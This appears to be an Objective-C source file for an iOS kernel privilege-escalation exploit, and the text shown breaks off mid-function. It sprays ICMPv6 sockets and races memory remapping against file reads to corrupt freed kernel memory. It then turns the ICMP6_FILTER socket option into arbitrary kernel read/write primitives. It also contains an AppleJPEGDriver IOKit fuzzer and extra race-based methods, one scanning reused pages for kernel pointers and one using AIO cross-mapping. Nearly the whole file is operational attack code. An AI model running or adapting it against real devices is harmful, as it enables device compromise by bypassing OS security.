#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <mach/mach.h>
#include <mach-o/dyld.h>
#include <sys/utsname.h>
#include <sys/socket.h>
#include <sys/fileport.h>
#include <pthread.h>
#include <sys/uio.h>
#include <sys/stat.h>
#include <sys/mount.h>
#include <spawn.h>
#include <dlfcn.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <errno.h>
#include <stdarg.h>
#include <aio.h>
#include <IOKit/IOKitLib.h>
#import <IOSurface/IOSurfaceRef.h>
void IOSurfacePrefetchPages(IOSurfaceRef surface);

extern kern_return_t mach_vm_allocate(task_t, mach_vm_address_t *, mach_vm_size_t, int);
extern kern_return_t mach_vm_deallocate(task_t, mach_vm_address_t, mach_vm_size_t);
extern kern_return_t mach_vm_map(task_t, mach_vm_address_t *, mach_vm_size_t,
    mach_vm_offset_t, int, mem_entry_name_port_t, memory_object_offset_t,
    boolean_t, vm_prot_t, vm_prot_t, vm_inherit_t);

#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"

#include "offsets.h"
#include "AppDelegate.h"

// ===== Global state =====
static uint64_t randomMarker;
static uint64_t wiredPageMarker;
static mach_port_t pcObject = MACH_PORT_NULL;
static mach_vm_address_t pcAddress = 0;
static mach_vm_size_t pcSize;
static int readFd, writeFd;
static NSMutableArray *socketPorts;
static NSMutableArray *socketPcbIds;
static int controlSocket = 0, rwSocket = 0;
static uint64_t controlSocketPcb = 0, rwSocketPcb = 0;
static uint8_t controlData[0x20];
static volatile uint8_t goSync = 0, raceSync = 0, freeThreadStart = 0;
static volatile uint8_t writeRequested = 0, writeDone = 0;
static volatile mach_vm_address_t freeTarget = 0;
static volatile mach_vm_size_t freeTargetSize = 0;
static volatile mem_entry_name_port_t targetObject = 0;
static volatile memory_object_offset_t targetObjectOffset = 0;
static pthread_t freeThread;
static pthread_t writeThread;
static int highestSuccessIdx = 0;
static int successReadCount = 0;
static struct iovec iov;
static char executablePath[PATH_MAX];
static const char *executableName;
static NSMutableDictionary *gMlockDict;

// Kernel state globals (used by all phases)
uint64_t gOurProc, gKernelProc, gOurTask, gKernelTask, gIS_TABLE;
uint64_t gOurPmap, gKernelPmap, gKernelBase, gKernelSlide;

// ===== Helpers =====
#define FAILURE(c) do { log_printf(@"[-] FAILURE at %s:%d\n", __FILE__, __LINE__); return; } while(0)

void c_log(const char *fmt, ...) {
    char buf[4096];
    va_list args;
    va_start(args, fmt);
    vsnprintf(buf, sizeof(buf), fmt, args);
    va_end(args);
    log_printf(@"%s", buf);
}
#define printf(...) c_log(__VA_ARGS__)

void memset64(void *ptr, uint64_t val, size_t sz) {
    for (size_t i = 0; i < sz; i += 8)
        *(uint64_t*)((uint8_t*)ptr + i) = val;
}

// ===== DarkSword ICMP6 Socket Exploit =====

IOSurfaceRef create_surface_with_address(uint64_t address, uint64_t size) {
    IOSurfaceRef surface = IOSurfaceCreate((__bridge CFDictionaryRef)@{
        @"IOSurfaceAddress": @(address),
        @"IOSurfaceAllocSize": @(size)
    });
    IOSurfacePrefetchPages(surface);
    return surface;
}

void surface_mlock(uint64_t address, uint64_t size) {
    gMlockDict[@(address)] = (__bridge id)create_surface_with_address(address, size);
}

void surface_munlock(uint64_t address, uint64_t size) {
    IOSurfaceRef ref = (__bridge IOSurfaceRef)gMlockDict[@(address)];
    if (ref) {
        CFRelease(ref);
        [gMlockDict removeObjectForKey:@(address)];
    }
}

static void create_physically_contiguous_mapping(mach_port_t *port, mach_vm_address_t *address, mach_vm_size_t size) {
    NSDictionary *params = @{
        (__bridge id)kIOSurfaceAllocSize : @(size),
        @"IOSurfaceMemoryRegion" : @"PurpleGfxMem",
    };

    IOSurfaceRef surface = IOSurfaceCreate((__bridge CFDictionaryRef)params);

    if (!surface) {
        printf("[-] IOSurfaceCreate failed — falling back to pure Mach VM\n");
        kern_return_t kr = mach_vm_allocate(mach_task_self(), address, size,
            VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR);
        if (kr != KERN_SUCCESS) {
            printf("[-] mach_vm_allocate: %s\n", mach_error_string(kr));
            return;
        }
        memset64((void*)*address, randomMarker, size);
        kr = mach_make_memory_entry_64(mach_task_self(), &size, *address,
            VM_PROT_DEFAULT, port, 0);
        if (kr != KERN_SUCCESS) {
            printf("[-] mach_make_memory_entry_64: %s\n", mach_error_string(kr));
            mach_vm_deallocate(mach_task_self(), *address, size);
            return;
        }
        printf("[+] fallback bounce buffer: entry=%u va=0x%llx size=0x%llx\n", *port, *address, size);
        return;
    }

    void *physicalMappingAddress = IOSurfaceGetBaseAddress(surface);
    printf("[+] physicalMappingAddress: %p\n", physicalMappingAddress);

    kern_return_t kr = mach_make_memory_entry_64(mach_task_self(), &size,
        (mach_vm_address_t)physicalMappingAddress, VM_PROT_DEFAULT, port, 0);
    if (kr != KERN_SUCCESS) {
        printf("[-] mach_make_memory_entry_64: %s\n", mach_error_string(kr));
        CFRelease(surface);
        return;
    }

    kr = mach_vm_map(mach_task_self(), address, size, 0,
        VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR, *port, 0, 0,
        VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
    if (kr != KERN_SUCCESS) {
        printf("[-] mach_vm_map: %s\n", mach_error_string(kr));
        mach_port_deallocate(mach_task_self(), *port);
        CFRelease(surface);
        return;
    }

    CFRelease(surface);
    printf("[+] IOSurface bounce buffer: entry=%u va=0x%llx size=0x%llx\n", *port, *address, size);
}

static bool initialize_bounce_buffer(uint64_t size) {
    pcSize = size;
    create_physically_contiguous_mapping(&pcObject, &pcAddress, pcSize);
    if (!pcObject || !pcAddress) {
        printf("[-] create_physically_contiguous_mapping failed\n");
        return false;
    }
    memset64((void *)pcAddress, randomMarker, pcSize);
    freeTarget = pcAddress;
    freeTargetSize = pcSize;
    freeThreadStart = 1;
    goSync = 1;
    return true;
}

void init_target_file(void) {
    char rp[1024] = {}, wp[1024] = {};
    confstr(_CS_DARWIN_USER_TEMP_DIR, rp, 1024);
    confstr(_CS_DARWIN_USER_TEMP_DIR, wp, 1024);
    char rn[64], wn[64];
    snprintf(rn, sizeof(rn), "/%u", arc4random());
    snprintf(wn, sizeof(wn), "/%u", arc4random());
    strlcat(rp, rn, sizeof(rp));
    strlcat(wp, wn, sizeof(wp));
    void *c = calloc(1, 2 * PAGE_SIZE);
    FILE *f = fopen(rp, "w"); fwrite(c, 1, 2 * PAGE_SIZE, f); fclose(f);
    f = fopen(wp, "w"); fwrite(c, 1, 2 * PAGE_SIZE, f); fclose(f);
    free(c);
    readFd = open(rp, O_RDWR);
    writeFd = open(wp, O_RDWR);
    remove(rp); remove(wp);
    fcntl(readFd, F_NOCACHE, 1);
    fcntl(writeFd, F_NOCACHE, 1);
}

void *free_thread(void *arg) {
    (void)arg;
    while (freeThreadStart == 0) {}
    while (goSync == 0) {}
    while (goSync != 0) {
        while (raceSync == 0) {}
        mach_vm_map(mach_task_self(), (mach_vm_address_t*)&freeTarget, freeTargetSize, 0,
            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, targetObject, targetObjectOffset, 0,
            VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
        raceSync = 0;
    }
    return NULL;
}

// Simple direct check: scan freed pages for non-randomMarker data
// indicating the kernel reused them (e.g., for inpcb structures)
bool scan_freed_pages(void *buf, mach_vm_size_t size) {
    uint64_t *words = (uint64_t *)buf;
    uint64_t n = size / sizeof(uint64_t);
    for (uint64_t i = 0; i < n; i++) {
        if (words[i] != randomMarker) return true;
    }
    return false;
}

fileport_t spray_socket(void) {
    int fd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
    if (fd < 0) return -1;
    fileport_t port = 0;
    fileport_makeport(fd, &port);
    close(fd);
    void *info = calloc(1, 0x400);
    syscall(336, 6, getpid(), 3, port, info, 0x400);
    uint64_t gencnt = *(uint64_t*)((uintptr_t)info + 0x110);
    [(NSMutableArray*)socketPorts addObject:@(port)];
    [(NSMutableArray*)socketPcbIds addObject:@(gencnt)];
    free(info);
    return port;
}

void sockets_release(void) {
    while ([(NSMutableArray*)socketPorts lastObject]) {
        mach_port_deallocate(mach_task_self(),
            ((NSNumber*)[(NSMutableArray*)socketPorts lastObject]).unsignedIntValue);
        [(NSMutableArray*)socketPorts removeLastObject];
        [(NSMutableArray*)socketPcbIds removeLastObject];
    }
}

kern_return_t phys_oob_read(mach_port_t memObj, mach_vm_offset_t memOff,
                             mach_vm_size_t size, mach_vm_offset_t off, void *buf) {
    // Direct read: copy data from freed pages at pcAddress + off
    // After socket spray, some freed pages may have been reused by inpcbs
    memcpy(buf, (void*)(pcAddress + off), size);
    
    // Check if any data differs from randomMarker (means page was reused)
    if (scan_freed_pages(buf, size)) {
        return KERN_SUCCESS;
    }
    return 1;
}

kern_return_t phys_oob_read_retry(mach_port_t memObj, mach_vm_offset_t memOff,
                                    mach_vm_size_t size, mach_vm_offset_t off, void *buf) {
    kern_return_t kr;
    do { kr = phys_oob_read(memObj, memOff, size, off, buf); } while (kr != KERN_SUCCESS);
    return kr;
}

void phys_oob_write(mach_port_t memObj, mach_vm_offset_t memOff,
                     mach_vm_size_t size, mach_vm_offset_t off, void *buf) {
    targetObject = memObj;
    targetObjectOffset = memOff;
    iov.iov_base = (void*)(pcAddress + 0x3f00);
    iov.iov_len = off + size;
    pwrite(writeFd, buf, size, 0x3f00 + off);
    for (int t = 0; t < 20; t++) {
        raceSync = 1;
        preadv(writeFd, &iov, 1, 0x3f00);
        while (raceSync == 1) {}
        mach_vm_map(mach_task_self(), &pcAddress, pcSize, 0,
            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, pcObject, 0, 0,
            VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
    }
    targetObject = 0;
}

void set_kaddr(uint64_t where) {
    memset(controlData, 0, 0x20);
    *(uint64_t*)controlData = where;
    setsockopt(controlSocket, IPPROTO_ICMPV6, ICMP6_FILTER, controlData, 0x20);
}

void early_kread(uint64_t where, void *buf, size_t size) {
    set_kaddr(where);
    socklen_t len = (socklen_t)size;
    getsockopt(rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, buf, &len);
}

uint64_t kread64(uint64_t where) {
    uint64_t v = 0; early_kread(where, &v, 8); return v;
}

uint32_t kread32(uint64_t where) {
    uint32_t v = 0; early_kread(where, &v, 4); return v;
}

uint16_t kread16(uint64_t where) {
    uint16_t v = 0; early_kread(where, &v, 2); return v;
}

uint8_t kread8(uint64_t where) {
    uint8_t v = 0; early_kread(where, &v, 1); return v;
}

uint64_t kread_ptr(uint64_t where) { return kread64(where); }

void kread_buf(uint64_t where, void *buf, size_t size) {
    uint8_t *b = (uint8_t*)buf;
    while (size >= 8) {
        *(uint64_t*)b = kread64(where);
        where += 8; b += 8; size -= 8;
    }
    if (size) early_kread(where, b, size);
}

void kwrite64(uint64_t where, uint64_t val) {
    uint8_t buf[0x20]; early_kread(where, buf, 0x20);
    *(uint64_t*)buf = val; set_kaddr(where);
    setsockopt(rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, buf, 0x20);
}

void kwrite32(uint64_t where, uint32_t val) {
    uint8_t buf[0x20]; early_kread(where, buf, 0x20);
    *(uint32_t*)buf = val; set_kaddr(where);
    setsockopt(rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, buf, 0x20);
}

void kwrite16(uint64_t where, uint16_t val) {
    uint8_t buf[0x20]; early_kread(where, buf, 0x20);
    *(uint16_t*)buf = val; set_kaddr(where);
    setsockopt(rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, buf, 0x20);
}

void kwrite8(uint64_t where, uint8_t val) {
    uint8_t buf[0x20]; early_kread(where, buf, 0x20);
    *(uint8_t*)buf = val; set_kaddr(where);
    setsockopt(rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, buf, 0x20);
}

void kwrite_buf(uint64_t where, void *buf, size_t size) {
    uint8_t *b = (uint8_t*)buf;
    while (size >= 8) {
        kwrite64(where, *(uint64_t*)b);
        where += 8; b += 8; size -= 8;
    }
    if (size) {
        uint8_t tmp[0x20];
        early_kread(where, tmp, 0x20);
        memcpy(tmp, b, size);
        set_kaddr(where);
        setsockopt(rwSocket, IPPROTO_ICMPV6, ICMP6_FILTER, tmp, 0x20);
    }
}

int find_and_corrupt_socket(mach_port_t memObj, mach_vm_offset_t seekOff,
                             void *rBuf, void *wBuf, NSMutableArray *usedGc, bool doRead) {
    if (doRead) phys_oob_read_retry(memObj, seekOff, OOB_SIZE, OOB_OFFSET, rBuf);
    int si = 0; bool found = false; uint64_t pso = 0;
    void *hit;
    do {
        hit = memmem(rBuf + si, OOB_SIZE - si, executableName, strlen(executableName));
        if (hit) {
            pso = (uint64_t)hit - (uint64_t)rBuf & 0xFFFFFFFFFFFFFC00;
            if (*(uint64_t*)((uintptr_t)rBuf + pso + OFFSET_ICMP6FILT + 8)) {
                found = true;
                break;
            }
        }
        si += 0x400;
    } while (hit && si < OOB_SIZE);
    if (!found) return -1;

    uint64_t tg = *(uint64_t*)((uintptr_t)rBuf + pso + 0x78);
    if (tg == ((NSNumber*)[(NSMutableArray*)socketPcbIds lastObject]).unsignedLongLongValue)
        return -1;

    int csi = -1;
    for (int i = 0; i < [socketPorts count]; i++) {
        if ([(NSNumber*)socketPcbIds[i] unsignedLongLongValue] == tg) {
            csi = i; break;
        }
    }
    if (csi < 0 || [(NSMutableArray*)usedGc containsObject:@(tg)]) return -1;
    [usedGc addObject:@(tg)];

    uint64_t inpNext = *(uint64_t*)((uintptr_t)rBuf + pso + 0x28) - 0x20;
    rwSocketPcb = inpNext;
    memcpy(wBuf, rBuf, OOB_SIZE);
    *(uint64_t*)((uintptr_t)wBuf + pso + OFFSET_ICMP6FILT) = inpNext + OFFSET_ICMP6FILT;
    *(uint64_t*)((uintptr_t)wBuf + pso + OFFSET_ICMP6FILT + 8) = 0;

    while (1) {
        phys_oob_write(memObj, seekOff, OOB_SIZE, OOB_OFFSET, wBuf);
        phys_oob_read_retry(memObj, seekOff, OOB_SIZE, OOB_OFFSET, rBuf);
        if (*(uint64_t*)((uintptr_t)rBuf + pso + OFFSET_ICMP6FILT) == inpNext + OFFSET_ICMP6FILT)
            break;
    }

    int sock = fileport_makefd((fileport_t)[(NSNumber*)socketPorts[csi] unsignedLongLongValue]);
    uint8_t gd[0x20]; socklen_t sl = 0x20;
    getsockopt(sock, IPPROTO_ICMPV6, ICMP6_FILTER, gd, &sl);
    if (*(uint64_t*)gd != (uint64_t)-1) {
        controlSocket = sock;
        rwSocket = fileport_makefd((fileport_t)[(NSNumber*)socketPorts[csi+1] unsignedLongLongValue]);
        return 0;
    }
    return -1;
}

// ===== IOKit Diagnostic =====

struct iokit_test {
    const char *name;
    const char *service;
    uint32_t type;
};

static bool test_iokit_service(const char *name, const char *path, uint32_t type) {
    io_service_t svc = IOServiceGetMatchingService(MACH_PORT_NULL,
        IOServiceNameMatching(path));
    if (!svc) {
        svc = IORegistryEntryFromPath(MACH_PORT_NULL, path);
    }
    if (!svc) {
        printf("[IOKit] %s: service not found\n", name);
        return false;
    }
    io_connect_t conn = 0;
    kern_return_t kr = IOServiceOpen(svc, mach_task_self_, type, &conn);
    if (kr != KERN_SUCCESS) {
        printf("[IOKit] %s @ %s: IOServiceOpen failed (%#x)\n", name, path, kr);
        IOObjectRelease(svc);
        return false;
    }
    printf("[IOKit] %s @ %s: OPENED (conn=%#x)\n", name, path, conn);
    IOServiceClose(conn);
    IOObjectRelease(svc);
    return true;
}

static void diagnostic_iokit(void) {
    printf("\n=== IOKit Diagnostic ===\n");
    // Try many service names to find what's accessible
    const char *svcNames[] = {
        "IOSurfaceRoot", "AppleJPEGDriver", "AGXDevice", "AGX14Device",
        "AGX13Device", "H11ANEIn", "H11ANE", "AppleANE",
        "IOAudioEngine", "IOHDACodecDriver", "AppleT8112Device",
        "IOPlatformExpertDevice", "AppleEmbeddedSPI",
    };
    for (int i = 0; i < sizeof(svcNames)/sizeof(svcNames[0]); i++) {
        io_service_t svc = IOServiceGetMatchingService(MACH_PORT_NULL,
            IOServiceNameMatching(svcNames[i]));
        if (svc) {
            io_connect_t conn = 0;
            kern_return_t kr = IOServiceOpen(svc, mach_task_self_, 0, &conn);
            printf("[IOKit] %s: %s (conn=%#x, kr=%#x)\n",
                   svcNames[i], kr == KERN_SUCCESS ? "OPENED" : "no UC", conn, kr);
            if (conn) IOServiceClose(conn);
            IOObjectRelease(svc);
        } else {
            printf("[IOKit] %s: not found\n", svcNames[i]);
        }
    }
    printf("=== IOKit Diagnostic Complete ===\n\n");
}

// ===== AppleJPEGDriver IOKit Fuzzer =====
static io_connect_t gJpegConn = 0;

static bool open_apple_jpeg(void) {
    if (gJpegConn) return true;
    io_service_t svc = IOServiceGetMatchingService(MACH_PORT_NULL,
        IOServiceNameMatching("AppleJPEGDriver"));
    if (!svc) { printf("[JPEG] service not found\n"); return false; }
    kern_return_t kr = IOServiceOpen(svc, mach_task_self_, 0, &gJpegConn);
    IOObjectRelease(svc);
    if (kr != KERN_SUCCESS) { printf("[JPEG] IOServiceOpen: %#x\n", kr); return false; }
    printf("[JPEG] conn=%#x\n", gJpegConn);
    return true;
}

// AppleJPEGDriver external method call wrapper
static kern_return_t call_jpeg_method(uint32_t method, void *input, size_t inputSz,
                                       void *output, size_t *outputSz) {
    uint32_t outputCnt = (uint32_t)(outputSz ? *outputSz / sizeof(uint64_t) : 0);
    uint32_t inputCnt = (uint32_t)(inputSz / sizeof(uint64_t));
    kern_return_t kr = IOConnectCallMethod(gJpegConn, method,
        (uint64_t*)input, inputCnt, NULL, 0,
        (uint64_t*)output, &outputCnt, NULL, NULL);
    if (outputSz) *outputSz = outputCnt * sizeof(uint64_t);
    return kr;
}

static void method_apple_jpeg_fuzz(void) {
    printf("\n[Method: JPEG_fuzz] Fuzzing AppleJPEGDriver...\n");
    if (!open_apple_jpeg()) { printf("[JPEG] Cannot open driver\n"); return; }

    // Method 0: setSurface — takes two IOSurface IDs
    printf("[JPEG] Trying method 0 (setSurface)...\n");
    {
        uint64_t args[3] = {0, 0, 0}; // inputSurfaceID, outputSurfaceID, flags
        size_t outSz = 0;
        kern_return_t kr = call_jpeg_method(0, args, sizeof(args), NULL, &outSz);
        printf("[JPEG] method 0 (null surfaces): kr=%#x\n", kr);
    }

    // Method 1: decode — needs surface set first
    printf("[JPEG] Trying method 1 (decode)...\n");
    {
        uint64_t args[4] = {0, 0, 0, 0}; // srcOff, dstOff, size, flags
        size_t outSz = 0;
        kern_return_t kr = call_jpeg_method(1, args, sizeof(args), NULL, &outSz);
        printf("[JPEG] method 1 (decode, no surface): kr=%#x\n", kr);
    }

    // Method 2: encode
    printf("[JPEG] Trying method 2 (encode)...\n");
    {
        uint64_t args[5] = {0, 0, 0, 0, 100}; // srcOff, dstOff, size, flags, quality
        size_t outSz = 0;
        kern_return_t kr = call_jpeg_method(2, args, sizeof(args), NULL, &outSz);
        printf("[JPEG] method 2 (encode, no surface): kr=%#x\n", kr);
    }

    // Fuzz methods 3-15 with various inputs
    for (uint32_t m = 3; m <= 15; m++) {
        uint64_t args[8] = {0};
        size_t outSz = sizeof(uint64_t) * 4;
        uint64_t output[4];
        // Try with different argument patterns
        for (int pat = 0; pat < 3; pat++) {
            memset(args, 0, sizeof(args));
            switch (pat) {
                case 0: args[0] = 0xFFFFFFFFFFFFFFFFULL; break;
                case 1: args[0] = 0x1000; args[1] = 0x1000; break;
                case 2: args[0] = (uint64_t)-1; break;
            }
            outSz = sizeof(output);
            kern_return_t kr = IOConnectCallMethod(gJpegConn, m,
                args, 2, NULL, 0, output, (uint32_t*)&outSz, NULL, NULL);
            if (kr != KERN_SUCCESS && kr != 0x2C) // ignore not-supported and timeout
                printf("[JPEG] method %d (pat %d): kr=%#x (outSz=%zu)\n", m, pat, kr, outSz);
        }
    }

    // IOSurface-backed test: create IOSurface, pass its ID to setSurface
    printf("[JPEG] Testing with real IOSurface...\n");
    NSDictionary *sfParams = @{
        (__bridge id)kIOSurfaceAllocSize : @(PAGE_SIZE),
        (__bridge id)kIOSurfaceWidth : @(64),
        (__bridge id)kIOSurfaceHeight : @(64),
        (__bridge id)kIOSurfaceBytesPerRow : @(256),
        (__bridge id)kIOSurfacePixelFormat : @(0x42475241), // 'ARGB'
    };
    IOSurfaceRef testSurface = IOSurfaceCreate((__bridge CFDictionaryRef)sfParams);
    if (testSurface) {
        uint32_t surfID = IOSurfaceGetID(testSurface);
        printf("[JPEG] test IOSurface ID=%u\n", surfID);
        uint64_t surfArgs[3] = {surfID, surfID, 0};
        kern_return_t kr = call_jpeg_method(0, surfArgs, sizeof(surfArgs), NULL, NULL);
        printf("[JPEG] setSurface (same ID for in/out): kr=%#x\n", kr);

        // Now try decode with valid surface
        uint64_t decArgs[4] = {0, 0, PAGE_SIZE, 0};
        kr = call_jpeg_method(1, decArgs, sizeof(decArgs), NULL, NULL);
        printf("[JPEG] decode with surface: kr=%#x\n", kr);

        CFRelease(testSurface);
    }

    IOServiceClose(gJpegConn);
    gJpegConn = 0;
    printf("[JPEG] fuzz complete\n");
}

// ===== Multi-Method Exploit =====

// Method 1: Enhanced SystemMemory scan — check ALL pages for kernel pointers
static bool method_system_memory(void) {
    printf("\n[Method: SystemMemory] Creating IOSurface with SystemMemory...\n");
    mach_vm_size_t sz = OOB_PAGES_NUM * PAGE_SIZE;
    NSDictionary *params = @{
        (__bridge id)kIOSurfaceAllocSize : @(sz),
        @"IOSurfaceMemoryRegion" : @"SystemMemory",
    };
    IOSurfaceRef surface = IOSurfaceCreate((__bridge CFDictionaryRef)params);
    if (!surface) {
        printf("[SystemMemory] IOSurfaceCreate failed\n");
        return false;
    }
    void *addr0 = IOSurfaceGetBaseAddress(surface);
    printf("[SystemMemory] addr0=%p\n", addr0);

    randomMarker = (uint64_t)arc4random() << 32 | arc4random();
    printf("[SystemMemory] marker=0x%016llx\n", randomMarker);
    memset64(addr0, randomMarker, sz);

    socketPorts = [NSMutableArray new];
    socketPcbIds = [NSMutableArray new];
    int n = 0;
    for (int i = 0; i < (10240 * 3 - 4096 * 2); i++) {
        if (spray_socket() == -1) break;
        n++;
    }
    printf("[SystemMemory] sprayed %d sockets\n", n);

    CFRelease(surface);
    printf("[SystemMemory] IOSurface released, pages freed\n");

    IOSurfaceRef surface2 = IOSurfaceCreate((__bridge CFDictionaryRef)params);
    if (!surface2) {
        printf("[SystemMemory] IOSurfaceCreate #2 failed\n");
        sockets_release();
        return false;
    }
    void *addr1 = IOSurfaceGetBaseAddress(surface2);
    printf("[SystemMemory] addr1=%p\n", addr1);

    // Full-page scan — report ALL non-marker words, not just first
    uint64_t *words = (uint64_t *)addr1;
    uint64_t total = sz / 8;
    int hits = 0, ptrHits = 0;
    for (uint64_t i = 0; i < total; i++) {
        if (words[i] != randomMarker) {
            hits++;
            uint64_t v = words[i];
            // Check if it looks like a kernel pointer (0xfffffff0... range)
            if ((v >> 40) == 0xFFFFFF) {
                printf("[SystemMemory] KPTR at +%#llx: 0x%016llx\n", i * 8, v);
                ptrHits++;
            } else if (hits <= 20) {
                printf("[SystemMemory] non-marker at +%#llx: 0x%016llx\n", i * 8, v);
            }
        }
    }
    printf("[SystemMemory] total non-marker words: %d (kernel pointers: %d)\n", hits, ptrHits);

    CFRelease(surface2);
    sockets_release();
    return hits > 0;
}

// Method 2: AIO cross-mapping exploit — uses shared physical pages
// Two memory entries from the same IOSurface → same physical pages at different VAs
// aio_read into VA_A while reading result from VA_B
static bool method_aio_exploit(void) {
    printf("\n[Method: AIO_Exploit] Testing AIO with dual mappings...\n");

    // Step 1: Create IOSurface (PurpleGfxMem for physically contiguous)
    mach_vm_size_t pgSz = 16 * PAGE_SIZE;
    NSDictionary *params = @{
        (__bridge id)kIOSurfaceAllocSize : @(pgSz),
        @"IOSurfaceMemoryRegion" : @"PurpleGfxMem",
    };
    IOSurfaceRef surface = IOSurfaceCreate((__bridge CFDictionaryRef)params);
    if (!surface) { printf("[AIO_Exploit] IOSurfaceCreate failed\n"); return false; }

    void *physBase = IOSurfaceGetBaseAddress(surface);
    printf("[AIO_Exploit] IOSurface physBase=%p\n", physBase);

    // Step 2: Create TWO memory entries from the same pages
    mach_port_t entry1 = MACH_PORT_NULL, entry2 = MACH_PORT_NULL;
    mach_vm_size_t meSz = pgSz;
    kern_return_t kr = mach_make_memory_entry_64(mach_task_self(), &meSz,
        (mach_vm_address_t)physBase, VM_PROT_DEFAULT, &entry1, 0);
    if (kr != KERN_SUCCESS) { printf("[AIO_Exploit] entry1: %s\n", mach_error_string(kr)); CFRelease(surface); return false; }

    kr = mach_make_memory_entry_64(mach_task_self(), &meSz,
        (mach_vm_address_t)physBase, VM_PROT_DEFAULT, &entry2, 0);
    if (kr != KERN_SUCCESS) { printf("[AIO_Exploit] entry2: %s\n", mach_error_string(kr)); mach_port_deallocate(mach_task_self_, entry1); CFRelease(surface); return false; }

    // Step 3: Map both entries at different user addresses
    mach_vm_address_t vaA = 0, vaB = 0;
    kr = mach_vm_map(mach_task_self(), &vaA, pgSz, 0,
        VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR, entry1, 0, 0,
        VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
    if (kr != KERN_SUCCESS) { printf("[AIO_Exploit] map A: %s\n", mach_error_string(kr)); goto cleanup; }

    kr = mach_vm_map(mach_task_self(), &vaB, pgSz, 0,
        VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR, entry2, 0, 0,
        VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
    if (kr != KERN_SUCCESS) { printf("[AIO_Exploit] map B: %s\n", mach_error_string(kr)); mach_vm_deallocate(mach_task_self_, vaA, pgSz); goto cleanup; }

    printf("[AIO_Exploit] vaA=0x%llx vaB=0x%llx (same physical pages)\n", vaA, vaB);

    // Step 4: Fill with marker via VA_A
    memset64((void*)vaA, 0xAA, pgSz);

    // Step 5: Create a pipe for aio_read
    int pipefd[2];
    if (pipe(pipefd) != 0) { printf("[AIO_Exploit] pipe failed\n"); goto cleanup; }

    // Write test data to pipe
    uint8_t pipeData[0x100];
    for (int i = 0; i < sizeof(pipeData); i++) pipeData[i] = i;
    write(pipefd[1], pipeData, sizeof(pipeData));

    // Step 6: Submit aio_read from pipe into VA_B
    struct aiocb aio;
    memset(&aio, 0, sizeof(aio));
    aio.aio_fildes = pipefd[0];
    aio.aio_buf = (void*)(vaB + 0x1000);  // Write to middle of shared pages
    aio.aio_nbytes = 0x100;
    aio.aio_sigevent.sigev_notify = SIGEV_NONE;

    kr = aio_read(&aio);
    printf("[AIO_Exploit] aio_read=%d (errno=%d)\n", kr, errno);

    // Step 7: While AIO is in-flight, change VA_B mapping through VA_A
    // Both share same physical pages — write through VA_A
    uint64_t *testWords = (uint64_t*)(vaB + 0x1000);
    printf("[AIO_Exploit] Before aio_suspend: *(vaB+0x1000)=0x%llx\n", *testWords);

    // Wait for completion
    const struct aiocb *list[1] = {&aio};
    aio_suspend(list, 1, NULL);
    kr = aio_error(&aio);
    size_t n = aio_return(&aio);
    printf("[AIO_Exploit] aio_error=%d aio_return=%zu\n", kr, n);

    // Read via VA_A (same physical pages) to verify cross-mapping read
    uint8_t *verify = (uint8_t*)(vaA + 0x1000);
    printf("[AIO_Exploit] Via VA_A: %02x %02x %02x %02x...\n",
           verify[0], verify[1], verify[2], verify[3]);
    printf("[AIO_Exploit] Via VA_B: %02x %02x %02x %02x...\n",
           ((uint8_t*)(vaB + 0x1000))[0], ((uint8_t*)(vaB + 0x1000))[1],
           ((uint8_t*)(vaB + 0x1000))[2], ((uint8_t*)(vaB + 0x1000))[3]);

    // Step 8: Try the race — deallocate VA_B during aio_read, remap to different entry
    memset(&aio, 0, sizeof(aio));
    aio.aio_fildes = pipefd[0];
    aio.aio_buf = (void*)(vaB + 0x2000);
    aio.aio_nbytes = 0x100;
    aio.aio_sigevent.sigev_notify = SIGEV_NONE;

    // Write new data to pipe
    uint8_t pipeData2[0x100];
    for (int i = 0; i < sizeof(pipeData2); i++) pipeData2[i] = 0xFF - i;
    write(pipefd[1], pipeData2, sizeof(pipeData2));

    kr = aio_read(&aio);
    printf("[AIO_Exploit] Race aio_read=%d\n", kr);

    // During read, remap vaA to point to different IOStream offset
    // Then check if the data appears at the old or new location
    mach_vm_address_t oldVaA = vaA;
    mach_vm_deallocate(mach_task_self_, vaA, pgSz);
    kr = mach_vm_map(mach_task_self_, &vaA, pgSz, 0,
        VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE, entry1, 0, 0,
        VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
    printf("[AIO_Exploit] remapped vaA, kr=%d\n", kr);

    aio_suspend(list, 1, NULL);
    kr = aio_error(&aio);
    n = aio_return(&aio);
    printf("[AIO_Exploit] Race: aio_error=%d aio_return=%zu\n", kr, n);

    uint8_t bufA[0x100], bufB[0x100];
    memcpy(bufA, (void*)(vaA + 0x2000), 0x100);
    memcpy(bufB, (void*)(vaB + 0x2000), 0x100);

    printf("[AIO_Exploit] Race read via VA_A: %02x %02x...\n", bufA[0], bufA[1]);
    printf("[AIO_Exploit] Race read via VA_B: %02x %02x...\n", bufB[0], bufB[1]);

    bool match = (memcmp(bufA, bufB, 0x100) == 0);
    printf("[AIO_Exploit] VA_A == VA_B: %d\n", match);

    // Cleanup
    close(pipefd[0]); close(pipefd[1]);
    mach_vm_deallocate(mach_task_self_, vaA, pgSz);
